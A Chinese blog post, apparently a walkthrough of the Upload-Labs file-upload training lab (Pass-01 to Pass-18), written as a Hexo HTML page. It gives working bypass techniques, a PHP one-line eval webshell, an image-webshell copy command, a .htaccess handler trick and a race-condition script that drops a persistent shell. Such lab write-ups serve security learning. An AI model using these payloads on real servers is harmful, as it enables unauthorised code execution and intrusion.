@@ -1,0 +1,1211 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function () {
+        if ('') {
+            if (prompt('请输入文章密码') !== '') {
+                alert('密码错误！');
+                if (history.length === 1) {
+                    location.replace("https://evenyao.com"); // 这里替换成你的首页
+                } else {
+                    history.back();
+                }
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Upload-Labs">
+<meta property="og:url" content="http://yoursite.com/2020/02/17/Upload-Labs/index.html">
+<meta property="og:site_name" content="w1ndy">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass13_0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass13_1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass17_0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass17_1.jpg">
+<meta property="article:published_time" content="2020-02-17T08:58:57.000Z">
+<meta property="article:modified_time" content="2020-07-06T15:55:39.546Z">
+<meta property="article:author" content="w1ndy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/17/Upload-Labs/"/>
+
+
+
+
+
+  <title>Upload-Labs | w1ndy</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w1ndy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/Upload-Labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w1ndy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w1ndy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Upload-Labs</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-17T16:58:57+08:00">
+                2020-02-17
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-07-06T23:55:39+08:00">
+                2020-07-06
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload.jpg" alt=""></p>
+<a id="more"></a>
+<h2 id="Pass-01-js前端验证"><a href="#Pass-01-js前端验证" class="headerlink" title="Pass-01(js前端验证)"></a>Pass-01(js前端验证)</h2><p>上传zx.php文件，弹出一个弹框<br>弹框说明是通过前端js代码来判断文件类型的<br>禁用js,或者控制台执行以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">checkFile</span></span>()&#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>这样就将本身的检测函数覆盖掉了,直接上传即可</p>
+<h2 id="Pass-02-MIME类型验证"><a href="#Pass-02-MIME类型验证" class="headerlink" title="Pass-02(MIME类型验证)"></a>Pass-02(MIME类型验证)</h2><p>上传zx.php文件，显示 文件类型不正确，请重新上传！<br>用burp抓包<br>改包   Content-Type: image/gif<br>放包即可</p>
+<h2 id="Pass-03-扩展名验证"><a href="#Pass-03-扩展名验证" class="headerlink" title="Pass-03(扩展名验证)"></a>Pass-03(扩展名验证)</h2><p>修改后缀名为.phtml即可</p>
+<h2 id="Pass-04-htaccess文件解析漏洞"><a href="#Pass-04-htaccess文件解析漏洞" class="headerlink" title="Pass-04(.htaccess文件解析漏洞)"></a>Pass-04(.htaccess文件解析漏洞)</h2><p>发现没有过滤.htaccess文件<br>文件解析规则绕过<br>上传一个.htaccess文件<br>文件内容为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<p>这样所有文件都会被解析成php<br>制作一个图片马，上传即可，这样文件就会被解析为php文件<br>图片马制作过程如下：<br>一张普通照片1.jpg<br>一个写有一句话木马的2.php文件，内容为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">"pass"</span>]); <span class="built_in">echo</span> <span class="string">"success"</span>?&gt;</span><br></pre></td></tr></table></figure>
+<p>命令提示符下执行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+2.php/a upload.jpg</span><br></pre></td></tr></table></figure>
+<p>其中b是指二进制，a是指ASCII,upload.jpg就是最后生成的图片马</p>
+<h2 id="Pass-05-扩展名大写绕过"><a href="#Pass-05-扩展名大写绕过" class="headerlink" title="Pass-05(扩展名大写绕过)"></a>Pass-05(扩展名大写绕过)</h2><p>源码中发现没有将文件后缀名大小写统一处理，即后缀名大小写绕过<br>上传upload.PHP即可<br>常见扩展名绕过：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asp:asa,cer,cdx</span><br><span class="line">aspx:ashx,asmx,ascx</span><br><span class="line">php:php2、php3、php4、php5、phps、phtml</span><br><span class="line">jsp:jspx,jspf</span><br></pre></td></tr></table></figure>
+<h2 id="Pass-06-扩展名末尾空格绕过"><a href="#Pass-06-扩展名末尾空格绕过" class="headerlink" title="Pass-06(扩展名末尾空格绕过)"></a>Pass-06(扩展名末尾空格绕过)</h2><p>源码中发现没有对文件后缀名进行去空处理，可在后缀名后加入空格绕过<br>burpsuite抓包，修改文件名为’11.php ‘</p>
+<h2 id="Pass-07-扩展名末尾加-绕过"><a href="#Pass-07-扩展名末尾加-绕过" class="headerlink" title="Pass-07(扩展名末尾加.绕过)"></a>Pass-07(扩展名末尾加.绕过)</h2><p>源码中发现没有对文件后缀名末尾进行去’.’处理，利用windows特性，会自动去掉后缀名中最后的’.’,可在后缀名后加上’.’来绕过,即upload.php.</p>
+<h2 id="Pass-08-扩展名末尾加-DATA绕过"><a href="#Pass-08-扩展名末尾加-DATA绕过" class="headerlink" title="Pass-08(扩展名末尾加::$DATA绕过)"></a>Pass-08(扩展名末尾加::$DATA绕过)</h2><p>源码中发现没有对文件后缀名进行去’::$DATA’处理，可在后缀名后加上’::$DATA’来绕过，即上传upload.php::$DATA。但是没法getshell,原因是这个靶机是linux系统，而这是windows特性，且必须是php,必须是那个源文件。php在windows的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持”::$DATA”之前的文件名，他的目的就在于不检查后缀名</p>
+<h2 id="Pass-09-文件路径可控-空格-绕过"><a href="#Pass-09-文件路径可控-空格-绕过" class="headerlink" title="Pass-09(文件路径可控.空格.绕过)"></a>Pass-09(文件路径可控.空格.绕过)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">'/'</span>.<span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure>
+<p>上传文件路径是通过拼接处理的，即可构造11.php.空格.,然后末尾的点又被除去,该文件被处理后会变成11.php.,这样就可绕过了</p>
+<h2 id="Pass-10-针对str-ireplace函数双写后缀绕过"><a href="#Pass-10-针对str-ireplace函数双写后缀绕过" class="headerlink" title="Pass-10(针对str_ireplace函数双写后缀绕过)"></a>Pass-10(针对str_ireplace函数双写后缀绕过)</h2><p>上传文件的后缀名若在黑名单中，则会被替换为空，那么就可以通过双写来绕过，即上传11.pphphp</p>
+<h2 id="Pass-11-get方式路径可控-00截断"><a href="#Pass-11-get方式路径可控-00截断" class="headerlink" title="Pass-11(get方式路径可控%00截断)"></a>Pass-11(get方式路径可控%00截断)</h2><p>%00对PHP版本有要求<br>0、php版本必须小于5.3.4<br>1、magic_quotes_gpc必须为Off<br>而这个靶机php版本为7.2.21,所以利用失败了</p>
+<h2 id="Pass-12-post方式路径可控-00截断"><a href="#Pass-12-post方式路径可控-00截断" class="headerlink" title="Pass-12(post方式路径可控%00截断)"></a>Pass-12(post方式路径可控%00截断)</h2><p>同Pass-11</p>
+<h2 id="Pass-13-校验文件头，图片马-文件包含漏洞"><a href="#Pass-13-校验文件头，图片马-文件包含漏洞" class="headerlink" title="Pass-13(校验文件头，图片马+文件包含漏洞)"></a>Pass-13(校验文件头，图片马+文件包含漏洞)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bin</span> = fread(<span class="variable">$file</span>, 2); //只读2字节</span><br></pre></td></tr></table></figure>
+<p>发现只对文件的头2个字节做检测,可以利用图片马<br>先将图片马上传<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass13_0.jpg" alt=""><br>然后点击文件包含漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="line">*/</span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$file</span>))&#123;</span><br><span class="line">    include <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(__file__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>利用文件包含漏洞来包含刚上传的图片马<br>payload:?file=?file=upload/8820200706111144.png<br>成功getshell了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass13_1.jpg" alt=""></p>
+<h2 id="Pass-14-getimagesize绕过，图片马-文件包含漏洞"><a href="#Pass-14-getimagesize绕过，图片马-文件包含漏洞" class="headerlink" title="Pass-14(getimagesize绕过，图片马+文件包含漏洞)"></a>Pass-14(getimagesize绕过，图片马+文件包含漏洞)</h2><p>getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过<br>方法同Pass-13</p>
+<h2 id="Pass-15-exif-imagetype绕过，图片马-文件包含漏洞"><a href="#Pass-15-exif-imagetype绕过，图片马-文件包含漏洞" class="headerlink" title="Pass-15(exif_imagetype绕过，图片马+文件包含漏洞)"></a>Pass-15(exif_imagetype绕过，图片马+文件包含漏洞)</h2><p>exif_imagetype — 判断一个图像的类型<br>同Pass-14</p>
+<h2 id="Pass-16-二次渲染"><a href="#Pass-16-二次渲染" class="headerlink" title="Pass-16(二次渲染)"></a>Pass-16(二次渲染)</h2><p>imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。<br>该系列函数有：<br>imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br>imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br>imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像<br>imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像<br>imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像<br>上传图片马，但是并不能getshell,将上传的图片马下载下来，用16进制编辑器打开，可以发现里面的一句话木马被去除了。所以需要在图片中找到没被改变的部分，将一句话木马放在这里，再次上传就可getshell了</p>
+<h2 id="Pass-17-unlink-条件竞争"><a href="#Pass-17-unlink-条件竞争" class="headerlink" title="Pass-17(unlink,条件竞争)"></a>Pass-17(unlink,条件竞争)</h2><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass17_0.jpg" alt=""><br>如果上传符合后缀的文件，会被rename函数重命名，那样就无法拿到文件的路径了<br>如果直接上传包含一句话木马的php文件，但是当代码会检测到上传的是php文件时，就会执行unlink删除该文件，那么我们可以通过条件竞争的方式在unlink之前getshell,为了一直能getshell，可以在上传的write.php文件中写入以下代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$myfile</span>=fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) or die(<span class="string">"error"</span>);</span><br><span class="line"><span class="variable">$shell</span>=<span class="string">'&lt;?php @eval($_POST["pass"]); echo "success"?&gt;'</span>;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$shell</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在unlink之前执行write.php就可以在同一目录下产生一个shell.php，我们就可以通过shell.php来getshell了<br>为了增大write.php被执行的概率，这里使用burp中的intruder模块，在其中add一个变量$a$，用于intruder模块不断发包，burp开始攻击后，在浏览器不断访问write.php文件，攻击结束后访问shell.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass17_1.jpg" alt=""><br>成功getshell</p>
+<h2 id="Pass-18-rename-条件竞争"><a href="#Pass-18-rename-条件竞争" class="headerlink" title="Pass-18(rename,条件竞争)"></a>Pass-18(rename,条件竞争)</h2><p>对上传文件后缀名进行判断，检查了文件大小，文件是否已经存在等。如果文件能够上传成功，会对文件重命名<br>这里就产生了条件竞争漏洞，只要赶在rename执行之前getshell就可</p>
+<h2 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h2><h3 id="IIS-IIS6-0"><a href="#IIS-IIS6-0" class="headerlink" title="IIS(IIS6.0)"></a>IIS(IIS6.0)</h3><p>Windows server 2003广泛存在该漏洞<br>目录解析漏洞：形如1.asp/2.jpg<br>这里的1.asp是文件夹名，2.jpg是文件名<br>文件解析漏洞：形如1.asp;.jpg<br>IIS会把这里的jpg文件解析为asp文件</p>
+<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>形如1.jpg/2.php<br>这里的2.php并不存在，就会将1.jpg文件解析为php文件</p>
+<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>形如1.php.xxx<br>这里的xxx是指Apache不可识别的扩展名，例如1.php.rar<br>对于Apache低版本来说，扩展名是从右向左识别的，当遇到不可识别的扩展名时，它会跳过，继续向左寻找可识别的扩展名，例如这里的1.php.rar,由于rar对于Apache来说是不可识别的，就会向左继续寻找，发现php可以识别那么1.php.rar就会被识别为php文件</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Crypto/" rel="next" title="攻防世界-Crypto">
+                <i class="fa fa-chevron-left"></i> 攻防世界-Crypto
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/21/Perl%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6-ARGV%E4%B8%8A%E4%BC%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="prev" title="Perl网页文件+ARGV上传任意文件读取">
+                Perl网页文件+ARGV上传任意文件读取 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="w1ndy" />
+            
+              <p class="site-author-name" itemprop="name">w1ndy</p>
+              <p class="site-description motion-element" itemprop="description">时间从来不说话，却回答了所有问题</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+<div id="music163player">
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1430823226&auto=1&height=66"></iframe>
+</div>
+          
+          
+
+          
+          
+
+          
+          
+
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <!-- modify icon to fire by szw -->
+                <i class="fa fa-history fa-" aria-hidden="true"></i>
+                近期文章
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                
+                  <li>
+                    <a href="/2020/07/07/CVE-2020-7066/" title="CVE-2020-7066" target="_blank">CVE-2020-7066</a>
+                  </li>
+          
+                  <li>
+                    <a href="/2020/06/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="JavaScript原型链污染" target="_blank">JavaScript原型链污染</a>
+                  </li>
+          
+                  <li>
+                    <a href="/2020/06/22/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" title="现代密码学期末复习" target="_blank">现代密码学期末复习</a>
+                  </li>
+          
+                  <li>
+                    <a href="/2020/06/09/EternalBlue/" title="EternalBlue" target="_blank">EternalBlue</a>
+                  </li>
+          
+                  <li>
+                    <a href="/2020/05/23/WHUCTF/" title="WHUCTF" target="_blank">WHUCTF</a>
+                  </li>
+          
+      </ul>
+    </div>
+     
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-01-js前端验证"><span class="nav-text">Pass-01(js前端验证)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-02-MIME类型验证"><span class="nav-text">Pass-02(MIME类型验证)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-03-扩展名验证"><span class="nav-text">Pass-03(扩展名验证)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-04-htaccess文件解析漏洞"><span class="nav-text">Pass-04(.htaccess文件解析漏洞)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-05-扩展名大写绕过"><span class="nav-text">Pass-05(扩展名大写绕过)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-06-扩展名末尾空格绕过"><span class="nav-text">Pass-06(扩展名末尾空格绕过)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-07-扩展名末尾加-绕过"><span class="nav-text">Pass-07(扩展名末尾加.绕过)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-08-扩展名末尾加-DATA绕过"><span class="nav-text">Pass-08(扩展名末尾加::$DATA绕过)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-09-文件路径可控-空格-绕过"><span class="nav-text">Pass-09(文件路径可控.空格.绕过)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-10-针对str-ireplace函数双写后缀绕过"><span class="nav-text">Pass-10(针对str_ireplace函数双写后缀绕过)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-11-get方式路径可控-00截断"><span class="nav-text">Pass-11(get方式路径可控%00截断)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-12-post方式路径可控-00截断"><span class="nav-text">Pass-12(post方式路径可控%00截断)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-13-校验文件头，图片马-文件包含漏洞"><span class="nav-text">Pass-13(校验文件头，图片马+文件包含漏洞)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-14-getimagesize绕过，图片马-文件包含漏洞"><span class="nav-text">Pass-14(getimagesize绕过，图片马+文件包含漏洞)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-15-exif-imagetype绕过，图片马-文件包含漏洞"><span class="nav-text">Pass-15(exif_imagetype绕过，图片马+文件包含漏洞)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-16-二次渲染"><span class="nav-text">Pass-16(二次渲染)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-17-unlink-条件竞争"><span class="nav-text">Pass-17(unlink,条件竞争)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-18-rename-条件竞争"><span class="nav-text">Pass-18(rename,条件竞争)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务器解析漏洞"><span class="nav-text">服务器解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-IIS6-0"><span class="nav-text">IIS(IIS6.0)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nginx"><span class="nav-text">Nginx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache"><span class="nav-text">Apache</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w1ndy</span>
+
+  
+</div>
+<!--
+
+
+
+
+
